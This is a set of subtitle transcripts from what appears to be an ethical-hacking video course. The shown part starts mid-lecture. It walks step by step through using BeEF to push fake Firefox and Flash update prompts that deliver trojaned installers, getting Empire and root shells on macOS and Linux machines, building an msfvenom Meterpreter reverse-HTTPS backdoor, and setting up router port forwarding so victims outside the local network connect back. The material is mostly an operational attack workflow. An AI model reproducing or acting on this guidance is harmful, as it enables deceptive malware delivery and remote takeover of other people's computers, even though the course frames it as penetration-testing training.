And we can do 'sysinfo' to confirm and as you can see now we managed to get full control

57

00:04:10,900  -->  00:04:12,360
over the target computer.

58

00:04:13,240  -->  00:04:16,860
Now, we did this using a file that looks exactly like Firefox

59

00:04:17,060  -->  00:04:21,400
and we covered how to make your backdoor, how to combine it with any other file type

60

00:04:21,400  -->  00:04:23,280
and change the icon and all of that.

61

00:04:24,060  -->  00:04:28,660
And we also managed to do this through convincing way

62

00:04:28,660  -->  00:04:32,320
because the system itself told the person that there is a new update

63

00:04:32,400  -->  00:04:35,600
and when they installed the new update, this worked for them.

64

00:04:36,340  -->  00:04:40,180
It installed Firefox plus our backdoor at the same time.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,520  -->  00:00:07,800
Now, in this lecture I'd like to show you another example of delivering a Trojan as a fake update.

2

00:00:08,960  -->  00:00:12,920
In this video, I'm gonna be targeting a Mac OS X machine in here.

3

00:00:13,300  -->  00:00:19,060
As you can see the machine has browsed to my default web page which has the BeEF hook.

4

00:00:19,620  -->  00:00:22,340
And you can see that the machine got hooked in here

5

00:00:22,900  -->  00:00:26,820
and like we said before, BeEF works against all operating systems

6

00:00:26,940  -->  00:00:31,540
because it uses JavaScript and pretty much all browsers use JavaScript.

7

00:00:31,940  -->  00:00:34,780
So you can see that the operating system here is OS X

8

00:00:35,400  -->  00:00:38,540
and it's using Mozilla Firefox 52.

9

00:00:39,980  -->  00:00:41,380
Now, we're gonna go on Commands

10

00:00:42,040  -->  00:00:46,160
and you can actually use the command that we've seen before the 'Clippy' command

11

00:00:46,660  -->  00:00:48,980
but I want to show you a different example

12

00:00:49,360  -->  00:00:53,180
something that's more convincing for OS X users.

13

00:00:53,500  -->  00:00:56,280
Now again, you can use this method with Windows and Linux

14

00:00:56,580  -->  00:00:58,740
but we're just using OSX as an example.

15

00:00:59,820  -->  00:01:04,540
So what this command is gonna do, it's going to show a notification bar on the top of the browser

16

00:01:05,020  -->  00:01:08,080
and it's just gonna ask the user to install a new plugin.

17

00:01:09,000  -->  00:01:13,220
So, the first thing that you want to do is give the location of the Trojan

18

00:01:13,420  -->  00:01:15,540
that you want the target person to download.

19

00:01:16,240  -->  00:01:22,140
So for me, it starts at '192.168.0.34'.

20

00:01:22,540  -->  00:01:24,580
This is my new IP because I'm in a different network now,

21

00:01:24,940  -->  00:01:28,440
because my OS X machine is connected to a different network.

22

00:01:30,100  -->  00:01:38,700
And my backdoor is stored in 'evil-files/Firefox-OSX.zip'.

23

00:01:41,660  -->  00:01:44,220
Now, you can see it in here in my evil files.

24

00:01:45,260  -->  00:01:48,640
Now, this is a file that will open a Firefox installer

25

00:01:48,920  -->  00:01:50,060
and run my Empire backdoor at the same time.

26

00:01:50,060  -->  00:01:55,240
I've already set this up change the icon and it's ready to be executed now.

27

00:01:57,980  -->  00:02:01,620
We covered all of this in the OS X, Evil Files section,

28

00:02:02,280  -->  00:02:03,920
so if you don't remember how to do that,

29

00:02:04,280  -->  00:02:06,100
go back and revise the lectures there.

30

00:02:06,680  -->  00:02:10,280
For now, I have my Trojan ready and it's inside that zip file,

31

00:02:10,820  -->  00:02:12,260
so this is ready to deploy.

32

00:02:14,120  -->  00:02:19,880
I also want to change the notification message and I want to say that there is a new update.

33

00:02:22,740  -->  00:02:24,360
Click here to install.

34

00:02:25,840  -->  00:02:30,300
So, the plugin is very simple, like before, you just want to configure the options,

35

00:02:30,700  -->  00:02:37,500
set the location where you have your evil file and set the message that you want the target person to see.

36

00:02:38,240  -->  00:02:39,580
We're going to click on execute.

37

00:02:41,580  -->  00:02:47,040
And if we go here, you see that the target person sees the notification bar here on the top

38

00:02:47,600  -->  00:02:50,320
and it's telling them that there is a new update for Firefox.

39

00:02:51,080  -->  00:02:52,800
They're gonna click on it to install it

40

00:02:53,540  -->  00:02:57,400
and they're gonna get a file called 'Firefox-OSX.zip'.

41

00:02:58,180  -->  00:03:00,000
We're gonna click 'OK' to download it.

42

00:03:01,060  -->  00:03:04,600
And that's going to be downloaded in my downloads in here.

43

00:03:05,380  -->  00:03:08,080
I'm gonna click on this to show the file and find there,

44

00:03:08,620  -->  00:03:11,260
We're gonna double click the file to uncompress it.

45

00:03:12,080  -->  00:03:18,480
And when it's uncompressed as you can see, we have a normal file that has a Firefox icon

46

00:03:18,720  -->  00:03:21,820
and it looks very convincing, it doesn't look suspicious at all

47

00:03:22,280  -->  00:03:24,320
and if we double click this file.

48

00:03:25,820  -->  00:03:27,400
Click on Open.

49

00:03:29,860  -->  00:03:35,160
Now, as you can see Firefox is loading here, for the target person, so that all looks convincing and nice

50

00:03:35,700  -->  00:03:39,440
and they can 'drag and drop to use the new version of Firefox.

51

00:03:40,140  -->  00:03:42,440
But if we go back here to Empire,

52

00:03:42,940  -->  00:03:44,960
we see a connection coming back.

53

00:03:46,040  -->  00:03:47,620
And if we go to agents,

54

00:03:48,400  -->  00:03:52,580
you'll see that we have a session coming back from the Mac machine

55

00:03:52,920  -->  00:03:54,560
and we can interact with it.

56

00:03:57,360  -->  00:03:58,720
And get its info.

57

00:04:00,680  -->  00:04:02,240
To get the system info.

58

00:04:03,240  -->  00:04:08,300
And as you can see we managed to completely hack into the Mac OS X machine,

59

00:04:08,500  -->  00:04:13,600
using a notification bar that told the target person that there is a new update.

60

00:04:13,820  -->  00:04:18,740
When they download the update, they get a file that functions exactly like an update file

61

00:04:19,020  -->  00:04:21,500
but at the same time, it executes our backdoor.

62

00:04:22,360  -->  00:04:26,040
Again this notification bar can be used with Windows, Linux and OS X.

63

00:04:26,460  -->  00:04:28,940
I'm just using OS X here as an example.



━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:01,860  -->  00:00:06,380
In this lecture I'm gonna show you yet
another fake update command in BeEF.

2

00:00:07,880  -->  00:00:12,640
Now, I know it showed you a lot of these but this is actually the coolest one and my favorite one.

3

00:00:13,400  -->  00:00:17,280
The reason behind this is because this one looks very, very convincing

4

00:00:17,300  -->  00:00:20,200
and it looks very convincing on all operating systems.

5

00:00:20,920  -->  00:00:23,840
The ones we seen before they do work on all operating systems

6

00:00:24,260  -->  00:00:28,620
but they might look a bit different, depending on which operating system the target uses.

7

00:00:29,620  -->  00:00:33,780
I'm also going to target a Linux computer in this lecture, just for a change

8

00:00:34,100  -->  00:00:38,960
and just to prove to you that these attacks work regardless of the target operating system,

9

00:00:38,960  -->  00:00:44,420
you just want to make sure, you use a backdoor Trojan that works against that operating system.

10

00:00:47,300  -->  00:00:52,620
So, you can see here that my Linux is hooked, you can see that it's using Mozilla 53

11

00:00:52,620  -->  00:00:56,780
and we can see that the operating system here is set to Linux.

12

00:01:00,100  -->  00:01:01,720
Now, I'm gonna go on commands.

13

00:01:02,560  -->  00:01:04,480
I'm gonna go on Social Engineering

14

00:01:05,520  -->  00:01:09,420
and I'm gonna go on a Flash Update.

15

00:01:10,240  -->  00:01:14,720
And what this is gonna do, it's gonna show a notification that there is a new Flash Update

16

00:01:14,800  -->  00:01:16,520
and then when the person clicks on it,

17

00:01:16,740  -->  00:01:18,060
they'll download my Trojan.

18

00:01:20,660  -->  00:01:25,440
So, the first thing you want to do is put the URL for the notification image.

19

00:01:25,520  -->  00:01:29,600
Now, BeEF comes with a very nice flash update notification image

20

00:01:29,960  -->  00:01:33,780
and that's already stored in 'adobeflash_update.png',

21

00:01:34,380  -->  00:01:38,900
so all you have to do in this is just put the IP address of your computer.

22

00:01:39,800  -->  00:01:44,240
So now, I'm back on VirtualBox in the virtual network in VirtualBox,

23

00:01:44,440  -->  00:01:47,820
so my IP address is '10.20.14.213'.

24

00:01:50,020  -->  00:01:54,380
We're also gonna set this to a 'Custom_Payload' to download our custom backdoor.

25

00:01:55,320  -->  00:01:58,300
And then you want to set the download
URL in here,

26

00:01:58,400  -->  00:02:01,400
this is the location where your backdoor is stored.

27

00:02:02,240  -->  00:02:07,200
Now I'm gonna be using the backdoor that we created before in the Linux evil files.

28

00:02:07,680  -->  00:02:14,840
We created a 'Flash Update Deb'  that actually up, updates flash but at the same time runs our evil code.

29

00:02:15,340  -->  00:02:21,140
I'm not going to go through how to create this, we might, we explain this in the Linux evil file section.

30

00:02:21,280  -->  00:02:24,660
If you don't remember that then go back to that section and revise it.

31

00:02:25,480  -->  00:02:30,780
I have the file already stored here and 'var/www/html/evil-files',

32

00:02:31,620  -->  00:02:33,620
so I'm going to set that URL here.

33

00:02:37,360  -->  00:02:38,820
And that's it, I'm good to go.

34

00:02:39,780  -->  00:02:42,900
So you wanna change your IP address in here

35

00:02:43,460  -->  00:02:47,260
and put the location where the file is stored.

36

00:02:50,240  -->  00:02:51,800
Now, I'm going to hit on Execute.

37

00:02:52,820  -->  00:02:57,800
And if we go to the target machine, you'll see they get a Flash Update notification.

38

00:02:58,680  -->  00:03:04,800
Now, this notification is very convincing because it looks exactly like the notification that you get from Flash

39

00:03:05,000  -->  00:03:07,480
and when the person clicks on install,

40

00:03:09,300  -->  00:03:11,540
they'll get a 'flash-update.deb' file.

41

00:03:12,200  -->  00:03:14,340
We're gonna click on 'OK' to download it.

42

00:03:15,880  -->  00:03:17,560
Then, we're gonna go to my 'Downloads'.

43

00:03:21,960  -->  00:03:26,140
And I already have the old one here but
that doesn't matter, I'm just gonna double-click this.

44

00:03:29,160  -->  00:03:37,080
And as you can see like we seen before, you have a description about the plugin, you have more info about it,

45

00:03:38,360  -->  00:03:43,380
you can click on this and you get to their website, so it all looks very legit.

46

00:03:43,980  -->  00:03:47,960
And once we actually install this, I'm just gonna go back and install it.

47

00:03:50,600  -->  00:03:51,540
Put the password.

48

00:03:56,500  -->  00:03:58,780
And now, if we go back to the Kali machine,.

49

00:03:59,880  -->  00:04:04,020
You'll see that we get a root access on the target computer .

50

00:04:04,800  -->  00:04:06,220
So, if I do 'id'

51

00:04:07,140  -->  00:04:08,700
and do 'whoami'.

52

00:04:10,220  -->  00:04:17,600
You'll see that I am root on the target computer and I can do all Linux commands with root privileges,

53

00:04:17,600  -->  00:04:20,640
so I can literally do anything I want on the target system.

54

00:04:21,540  -->  00:04:25,180
Now, this will actually install Flash and update it for my target

55

00:04:25,540  -->  00:04:29,380
and at the same time, it'll allow me to hack into that computer.

56

00:04:30,700  -->  00:04:33,280
And just like all the other methods with BeEF.

57

00:04:33,560  -->  00:04:39,760
This method works against Windows OS X and Linux and any browser that uses JavaScript.

58

00:04:40,040  -->  00:04:44,520
You just want to make sure that you use a backdoor that works on the target computer.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

==================================================================================

# Section 15: Using The Above Attacks Outside The Local Network


1
00:00:00,260 --> 00:00:05,780
So far in the course, we learned a number of methods to gain access to computers.

2
00:00:05,810 --> 00:00:11,870
We tested everything, though, within our own network just to simplify things.

3
00:00:12,170 --> 00:00:17,490
That does not mean that these attacks only work inside the network.

4
00:00:17,510 --> 00:00:22,490
In fact, all of them work outside of the network on the Internet.

5
00:00:22,490 --> 00:00:29,300
Even if the target computer is connected to different networks or even if it is in a completely different

6
00:00:29,300 --> 00:00:30,020
country.

7
00:00:30,290 --> 00:00:34,790
The only thing is you need to configure port forwarding properly.

8
00:00:34,910 --> 00:00:39,890
You can do that using the Router's settings page, and that's what we're going to focus on.

9
00:00:39,890 --> 00:00:47,060
But you can also achieve the same results by installing Kali or your tools on the cloud or using a cloud

10
00:00:47,150 --> 00:00:53,480
SSH server or using a tunneling service that is designed to solve this very problem.

11
00:00:53,750 --> 00:00:59,960
Obviously, each one of these methods come with its advantages and disadvantages, but we're focusing

12
00:01:00,060 --> 00:01:06,420
on the first one because in my opinion, you have to understand how this method works before being able

13
00:01:06,420 --> 00:01:08,130
to use all of the other methods.

14
00:01:08,130 --> 00:01:14,250
So we're spending four lectures explaining this method in detail so you can use it with whatever service

15
00:01:14,250 --> 00:01:19,050
you want, whether you want to use it with beef, with backdoors, with your own web server, or with

16
00:01:19,050 --> 00:01:22,470
any other service that you want to expose to the Internet.

17
00:01:22,950 --> 00:01:26,220
So first of all, let's have a look on a default network setup.

18
00:01:26,220 --> 00:01:27,270
So we've seen this before.

19
00:01:27,270 --> 00:01:28,680
We've seen a similar diagram.

20
00:01:28,680 --> 00:01:34,200
And right here you can see that we have the router, we have the client that's connected to the router,

21
00:01:34,200 --> 00:01:37,170
and then we have the router that is connected to the Internet.

22
00:01:37,380 --> 00:01:42,630
And we mentioned before that all the clients, all devices inside the network, they actually don't

23
00:01:42,630 --> 00:01:43,980
have Internet connection.

24
00:01:44,010 --> 00:01:47,280
They can only access the Internet through the router.

25
00:01:47,280 --> 00:01:52,170
So whenever they want to request something, whenever they want to go to a website, for example, if

26
00:01:52,170 --> 00:01:57,900
they wanted to go to Google, this device will actually send a request to the router.

27
00:01:57,930 --> 00:02:03,240
The router is going to go to the internet, it's going to get Google.com home and the response is going

28
00:02:03,240 --> 00:02:04,470
to be sent to the router.

29
00:02:04,470 --> 00:02:09,330
Then the router will forward that response to the device that requested it.

30
00:02:11,170 --> 00:02:15,610
So inside the network, each device has its own private IP.

31
00:02:15,850 --> 00:02:21,540
So we can see these IPS are written in red and these only exist within the network.

32
00:02:21,550 --> 00:02:27,460
That's why we call them private IPS, because outside the network these IPS are not visible.

33
00:02:28,690 --> 00:02:31,930
And we can see that the router here has two IPS.

34
00:02:31,960 --> 00:02:37,810
So it has a private IP in red, which is accessible by all the devices in the network and it's only

35
00:02:37,810 --> 00:02:39,820
used inside the network.

36
00:02:40,480 --> 00:02:46,390
It also has a public IP, which I have here in green, and this is the IP that's accessible through

37
00:02:46,390 --> 00:02:46,900
the Internet.

38
00:02:46,900 --> 00:02:48,970
So this is the IP that Google sees.

39
00:02:48,970 --> 00:02:54,520
So whenever you actually go to Google or to any other website, they see an IP address, but they won't

40
00:02:54,520 --> 00:02:56,220
see your private IP address.

41
00:02:56,230 --> 00:03:01,900
They'll actually see the IP address of the router because the router is the device that's actually making

42
00:03:01,900 --> 00:03:02,650
the requests.

43
00:03:02,650 --> 00:03:03,790
It's not you.

44
00:03:03,940 --> 00:03:10,450
So all the requests made by all of these devices on the same network, they'll all appear as if they're

45
00:03:10,450 --> 00:03:13,780
coming from the same machine or from the same IP.

46
00:03:14,020 --> 00:03:20,350
This is again because the only device that has access to the Internet is the router, and it's none

47
00:03:20,380 --> 00:03:21,460
of these devices.

48
00:03:22,990 --> 00:03:25,240
Now let's go back to our scenario.

49
00:03:25,240 --> 00:03:30,550
So we usually in most cases, or if you think about it, in all of the attacks that we do, the main

50
00:03:30,550 --> 00:03:32,740
thing is we want to get a reverse connection.

51
00:03:32,740 --> 00:03:38,440
Even when we're using beef, we actually get a connection on Port 3000, which is which is the port

52
00:03:38,470 --> 00:03:39,610
that beef is working on.

53
00:03:39,610 --> 00:03:46,090
And when we're using our back doors, we actually receive a connection on the port that we specify when

54
00:03:46,090 --> 00:03:47,280
we make the backdoor.

55
00:03:47,290 --> 00:03:52,660
So the thing that to keep in mind when you want to send that backdoor to somewhere outside your network,

56
00:03:52,690 --> 00:03:57,070
the first thing you want to keep in mind is that your local IP is not going to be visible.

57
00:03:57,070 --> 00:04:04,270
So what you want to do is you want to use the public IP, the IP of the router, and to get that, all

58
00:04:04,270 --> 00:04:08,290
you have to do is just go on Google and then type in what's my IP?

59
00:04:12,160 --> 00:04:17,650
And as you can see, Google is telling me that my IP address is this and this IP will actually be the

60
00:04:17,650 --> 00:04:20,980
same from all the machines in the same network.

61
00:04:22,140 --> 00:04:24,360
Now, I should note here if I run ifconfig.

62
00:04:26,820 --> 00:04:30,990
I'm actually connected through a wireless card, so I'm not using a Nat connection.

63
00:04:30,990 --> 00:04:36,270
I'm using an external wireless card that's connected to my home network right here.

64
00:04:37,630 --> 00:04:43,330
So all the devices in my wireless network at home will have this IP.

65
00:04:43,930 --> 00:04:46,600
Again, that's because they all use the same router.

66
00:04:46,630 --> 00:04:48,940
They're all connected to the same network.

67
00:04:50,110 --> 00:04:54,170
So we're going to use this IP in our backdoor.

68
00:04:54,190 --> 00:04:59,210
We're going to send the backdoor to a person that exists on the Internet so exists in here.

69
00:04:59,230 --> 00:05:04,450
That person is going to run that back door and that backdoor is going to use a reverse connection.

70
00:05:04,450 --> 00:05:09,010
So it's going to try to connect back to the router on port 8080.

71
00:05:09,040 --> 00:05:16,210
For example, if we chose that port in the backdoor, once the router gets a request for port 8080,

72
00:05:16,240 --> 00:05:21,850
it won't know what to do with it because the router is not actually listening to port 8080.

73
00:05:22,000 --> 00:05:25,570
And this request will not tell the router what it wants to go.

74
00:05:25,750 --> 00:05:29,470
So what we need to do is we need to configure the router to tell it.

75
00:05:29,470 --> 00:05:35,590
Whenever you get a request on port 80, 80, 80, then I want you to forward that port to the Kali machine.

76
00:05:36,500 --> 00:05:38,580
And you can do that for any part you want.

77
00:05:38,600 --> 00:05:40,630
So I'm just using AT&amp;T as an example.

78
00:05:40,640 --> 00:05:47,210
But you can you can do it for any port that you're listening on, whether it's 80, 80, 444 or 3004

79
00:05:47,210 --> 00:05:47,570
beef.

80
00:05:47,600 --> 00:05:51,860
The main idea is you want to use your real IP outside the network.

81
00:05:51,860 --> 00:05:56,960
So whenever we run any attack in previous lectures and even in future lectures, if you want to run

82
00:05:56,960 --> 00:06:01,850
that attack on the Internet on someone that doesn't exist on your home network, then first of all,

83
00:06:01,850 --> 00:06:09,200
make sure you use your public IP and make sure you configure your router to forward requests on the

84
00:06:09,200 --> 00:06:12,020
port that you're listening on to the Kali machine.

85
00:06:12,620 --> 00:06:15,350
And I'm going to show you how to do that in the next lecture.

86
00:06:15,350 --> 00:06:20,000
Right now I just want you to get the idea of what we need to do and how is that going to work.

87
00:06:20,000 --> 00:06:24,410
So we're going to have examples in the next lectures and it's going to become much more clear.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1
00:00:00,500 --> 00:00:01,010
Okay.

2
00:00:01,010 --> 00:00:02,090
So now let's go ahead.

3
00:00:02,090 --> 00:00:04,040
Let's create a back door.

4
00:00:04,040 --> 00:00:10,760
And the only difference is we're going to set the IP to the public IP instead of the local IP.

5
00:00:10,760 --> 00:00:14,210
So we're going to create a back door exactly the same way that we used to create it.

6
00:00:14,210 --> 00:00:16,520
When we're hacking devices in the same network.

7
00:00:16,520 --> 00:00:21,320
And I'm going to do this a bit quickly because we've done it and there's nothing new with this.

8
00:00:21,920 --> 00:00:27,020
So as mentioned previously, the tool that we're going to be using is called MSF venom.

9
00:00:27,110 --> 00:00:31,310
We're using the dash dash payload argument to specify the payload.

10
00:00:31,310 --> 00:00:34,550
So it's the exact same payload that we used in our previous video.

11
00:00:34,550 --> 00:00:37,040
So it runs on windows platforms.

12
00:00:37,040 --> 00:00:45,140
The type of payload is a Meterpreter payload and it uses reverse connection over the Https protocol.

13
00:00:45,560 --> 00:00:48,890
Then we're setting the basic options of this payload.

14
00:00:48,890 --> 00:00:52,010
We can see that the El port is set to 8080 by default.

15
00:00:52,010 --> 00:00:53,720
And I'm going to keep that the same.

16
00:00:53,720 --> 00:00:56,600
The only thing that I'm going to change is the El host.

17
00:00:56,600 --> 00:01:01,740
And in the previous videos when we were receiving connections on our own computer.

18
00:01:01,740 --> 00:01:08,310
We used to set it to the local IP, because that's the IP that the devices use inside the network.

19
00:01:08,310 --> 00:01:14,430
But whenever you want to do things on the outside, we want to use the real IP because these internal

20
00:01:14,430 --> 00:01:18,690
IPS are not visible to computers outside the network.

21
00:01:18,690 --> 00:01:20,910
So I'm going to use the IP that I see on Google.

22
00:01:20,910 --> 00:01:27,210
So when I type in what's my IP, I get this IP and I'm going to use that as the host in my back door.

23
00:01:27,210 --> 00:01:30,900
So I'm just going to copy this and I'm going to set it here.

24
00:01:31,500 --> 00:01:33,000
We're using the public IP.

25
00:01:33,000 --> 00:01:36,750
So this is the most important step in this I'm going to hit enter.

26
00:01:37,260 --> 00:01:40,140
And that has generated my payload for me.

27
00:01:40,140 --> 00:01:41,790
So that's all done.

28
00:01:42,060 --> 00:01:46,140
Now all we have to do is just listen for incoming connections.

29
00:01:46,140 --> 00:01:48,840
To do that we're actually going to use Metasploit.

30
00:01:48,840 --> 00:01:54,330
So first of all we need to launch the console by doing MSF console as you know.

31
00:01:55,020 --> 00:02:03,940
And when it starts we're going to use a module that is called exploit multi handler, we can simply

32
00:02:03,940 --> 00:02:08,320
do show options to see all of the options that we can set for it.

33
00:02:08,320 --> 00:02:15,430
So we're going to do set followed by the option name that we want to modify which is the payload.

34
00:02:15,430 --> 00:02:21,340
So in the back door we used windows meterpreter reverse https.

35
00:02:22,960 --> 00:02:31,060
If we do show options again you'll see that we'll actually get to see different options because the

36
00:02:31,060 --> 00:02:32,710
payload is different.

37
00:02:32,710 --> 00:02:38,560
So you can see that the options here are again very similar to the options that we set when we created

38
00:02:38,560 --> 00:02:39,400
the backdoor.

39
00:02:39,400 --> 00:02:45,130
So the main two options that we need to modify are the host and the El port.

40
00:02:45,130 --> 00:02:50,050
And the El host is the IP of the computer that will receive the connection.

41
00:02:50,050 --> 00:02:55,120
I'm actually going to listen on my local IP, so I'm not going to listen on the external.

42
00:02:55,120 --> 00:02:58,480
I'm going to listen on the local because I can't listen on the external.

43
00:02:58,480 --> 00:03:02,860
I'm actually in the network and I only have control over my current computer.

44
00:03:02,860 --> 00:03:06,490
So what I'm going to do now is I'm in here in the Kali machine.

45
00:03:06,490 --> 00:03:08,440
I'm going to listen on port 8080.

46
00:03:08,620 --> 00:03:13,690
And in the external device, the backdoor will try to connect to the backdoor.

47
00:03:13,690 --> 00:03:16,570
So the step after that will be set up.

48
00:03:16,600 --> 00:03:22,090
IP forwarding to tell the router to forward port 8080 to the Kali machine.

49
00:03:22,420 --> 00:03:28,660
So to get our current IP, we saw that when we ran the backdoor we can do ifconfig.

50
00:03:28,660 --> 00:03:32,170
And we can see my IP is right here.

51
00:03:32,170 --> 00:03:33,910
So I'm going to copy it.

52
00:03:33,910 --> 00:03:39,760
So you do set followed by the option name which is El host followed by the value.

53
00:03:39,760 --> 00:03:42,490
And I'm going to paste my value which is my IP.

54
00:03:43,180 --> 00:03:44,920
Next we're going to set the port.

55
00:03:44,920 --> 00:03:47,470
So we're going to do set El port.

56
00:03:47,470 --> 00:03:51,070
And the port that we used in the backdoor was 880.

57
00:03:51,820 --> 00:03:57,970
Now that we set everything we can do show options one more time to make sure that the options were set

58
00:03:58,000 --> 00:03:59,950
correctly and perfect.

59
00:03:59,950 --> 00:04:03,130
As you can see, we can see that the El host is set to my IP.

60
00:04:03,130 --> 00:04:05,420
And same goes for the El port.

61
00:04:05,480 --> 00:04:09,320
So now that we're happy with everything we can do exploit.

62
00:04:11,330 --> 00:04:17,600
As you can see here, it's listening on my private IP and it's listening on port 8080.

63
00:04:17,630 --> 00:04:19,910
So now we did the two main steps.

64
00:04:19,910 --> 00:04:21,200
We created a backdoor.

65
00:04:21,200 --> 00:04:26,180
And the backdoor will give us connections back based on the real IP address.

66
00:04:26,180 --> 00:04:29,510
And we're listening on our local machine.

67
00:04:29,510 --> 00:04:32,150
We're listening on port 8080 in the Kali machine.

68
00:04:32,150 --> 00:04:36,770
So when the target person runs the backdoor on the internet, the backdoor will try to connect to this

69
00:04:36,800 --> 00:04:38,780
IP on port 8080.

70
00:04:38,810 --> 00:04:43,280
The only problem now is the gateway which is the router right here.

71
00:04:43,430 --> 00:04:45,770
It doesn't have port 8080 open.

72
00:04:45,770 --> 00:04:47,480
So it's going to receive the connection.

73
00:04:47,480 --> 00:04:49,340
It's not going to know what to do with it.

74
00:04:49,340 --> 00:04:54,410
So we actually need to configure the router to tell it whenever you get something whenever you get a

75
00:04:54,410 --> 00:04:59,120
connection on port 8080, I want you to redirect it to my Kali machine.

76
00:04:59,750 --> 00:05:01,580
And we can do that in two ways.

77
00:05:01,580 --> 00:05:04,730
And we're going to talk about them in the next lecture.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1

00:00:00,960  -->  00:00:06,040
Now in this lecture we'll learn how to configure the router so that it forwards incoming connections

2

00:00:06,040  -->  00:00:07,376
to the Kali machine.

3

00:00:07,376  -->  00:00:11,720
So we can receive reverse connections, we can hook people to BeEF

4

00:00:11,720  -->  00:00:16,760
and launch attacks outside the network the same way that we used to launch them inside the network.

5

00:00:17,420  -->  00:00:23,740
So, to get to the router settings, usually the router is the first IP in the subnet.

6

00:00:23,740  -->  00:00:32,160
So you can see that my IP was 192.168.0.11, usually the router is the first one so it'll be 192.168.0.1.

7

00:00:32,800  -->  00:00:38,000
Also another way to get it, you can type in route -n

8

00:00:38,860  -->  00:00:44,000
and that will show you where the Gateway is and as you can see it's at 192.168.0.1,

9

00:00:44,220  -->  00:00:47,120
so this is the local IP address of the router.

10

00:00:47,640  -->  00:00:51,860
We're gonna browse that, browse that in our browser so I'm just going to type it in here

11

00:00:54,160  -->  00:01:00,980
192.168.0.1, hit Enter and as you can see I have my router settings

12

00:01:00,980  -->  00:01:03,440
and I have to login with the username and password.

13

00:01:03,740  -->  00:01:07,340
Now the router settings might look different from router to router,

14

00:01:07,340  -->  00:01:09,280
but the names are usually the same.

15

00:01:09,460  -->  00:01:13,080
Usually, first of all, you'll have to login as you can see here for me

16

00:01:13,080  -->  00:01:20,080
and you either have a default username and password or it will be, you'll see them on a sticker

17

00:01:20,080  -->  00:01:22,600
behind or underneath the router itself.

18

00:01:23,140  -->  00:01:26,700
So, for me I've actually changed the password so I'm just gonna login.

19

00:01:32,480  -->  00:01:37,160
So, I'm logged in here to my control panel and again it might look different for you,

20

00:01:37,420  -->  00:01:43,340
but you want to look for something called IP forwarding for me it's under 'ADVANCED'.

21

00:01:43,340  -->  00:01:48,300
So I'm going to go to 'ADVANCED' and then I'm gonna go on 'FORWARDING'

22

00:01:49,640  -->  00:01:52,300
and this is where I can set up my IP forwarding.

23

00:01:52,600  -->  00:01:55,800
So, look for something called IP forwarding or...

24

00:01:56,400  -->  00:02:00,440
I've actually seen them on some routers called Virtual Network, I don't know why,

25

00:02:01,120  -->  00:02:06,700
but you want to look for something that allows you to set up rules to redirect
ports inside the network.

26

00:02:07,500  -->  00:02:13,660
So, the port that were listening on at the moment is port 8080, so that's the port that we picked

27

00:02:13,860  -->  00:02:16,860
in the handler, that's the port that we picked in the backdoor

28

00:02:16,860  -->  00:02:19,180
and that's the port that we want to get the connection on.

29

00:02:19,400  -->  00:02:25,560
So, the public port is going to be 8080 and again, the target port is going to be 8080

30

00:02:26,560  -->  00:02:31,500
and the target IP address is the IP address that's listening on the port,

31

00:02:31,500  -->  00:02:35,260
so this is the IP address of the Kali machine where you have your handlers running.

32

00:02:35,560  -->  00:02:40,680
So, the IP address of my Kali machine right here is 192.168.0.11

33

00:02:40,680  -->  00:02:48,200
and we can see that also right here from the result of 'ifconfig', so it's 192.168.0.11.

34

00:02:48,780  -->  00:02:53,700
I'm gonna type that in here and that's it that's the rule that we wanna add.

35

00:02:53,700  -->  00:02:57,180
I'm gonna click on save and that rule is saved.

36

00:02:57,180  -->  00:03:03,900
So now, whenever the router gets a request for port 8080, it will know that it's gonna forward

37

00:03:03,900  -->  00:03:08,640
that request to the Kali machine and the router will not cut that connection.

38

00:03:08,840  -->  00:03:14,020
So, we've actually set up a proper route right now, so the first thing we did is we created the backdoor,

39

00:03:14,440  -->  00:03:18,160
we used the real IP in the backdoor, we didn't use the private IP.

40

00:03:18,520  -->  00:03:22,283
So we didn't use the 192.168.0.11, we used the real IP.

41

00:03:22,283  -->  00:03:26,660
We're gonna send that backdoor to a device in a different network.

42

00:03:27,460  -->  00:03:33,580
That device is gonna run the back door, the back door will try to connect back on the real IP to the router,

43

00:03:33,580  -->  00:03:38,520
but the router will know exactly what to do with this because we just set up a rule telling the router

44

00:03:38,520  -->  00:03:42,940
to forward any request that it gets on port 8080 to the Kali machine.

45

00:03:44,220  -->  00:03:48,243
What I also want to do is I actually want to set up a rule for port 80.

46

00:03:48,243  -->  00:03:51,580
This is the port that Apache, that my web server runs on

47

00:03:51,800  -->  00:03:57,780
and I want to enable that so that I can download the route-- the backdoor from the target computer.

48

00:03:58,020  -->  00:04:00,180
So I'm going to add the rule for port 80

49

00:04:01,520  -->  00:04:04,660
and again this is going to be the same machine in the Kali machine

50

00:04:05,780  -->  00:04:09,680
and we're gonna put port 80 here we're gonna save this rule

51

00:04:10,960  -->  00:04:16,780
and this will allow me to download the backdoor because I placed the back door in var/www right here.

52

00:04:16,980  -->  00:04:20,060
So, I'll actually be able to access my web server in Kali

53

00:04:20,400  -->  00:04:23,600
and download the backdoor from outside the internet.

54

00:04:23,980  -->  00:04:26,500
So I'm gonna start my Apache web server.

55

00:04:30,320  -->  00:04:33,340
So this is actually just another example, you don't really need to do this,

56

00:04:33,340  -->  00:04:37,840
you can just transfer the backdoor using USB or any other method or send it by email.

57

00:04:38,160  -->  00:04:41,780
I'm just showing you another example of how port forwarding is used.

58

00:04:43,160  -->  00:04:47,820
Now I'm gonna go to a Windows machine and that Windows machine is gonna be connected

59

00:04:47,820  -->  00:04:51,920
to a completely different network and we're going to download the file from there.

60

00:04:53,760  -->  00:04:59,840
So here is my Windows machine and if I go and check my IP, you'll see it has a different external public IP.

61

00:04:59,840  -->  00:05:01,800
So, I'm just gonna look for what's my IP,

62

00:05:03,780  -->  00:05:10,320
you'll see that the IP here is completely different than the IP of this of this machine that we used.

63

00:05:11,800  -->  00:05:17,000
So, these are two completely separate devices connected to different networks

64

00:05:17,760  -->  00:05:22,520
and what I'm gonna do now is I'm gonna access my Apache web server

65

00:05:22,520  -->  00:05:26,900
and download the backdoor and normally without IP forwarding you won't be able to do that.

66

00:05:27,480  -->  00:05:36,480
And to access that first I'm gonna get the IP of this machine again because I forgot it and 89.100.145.189.

67

00:05:43,200  -->  00:05:50,180
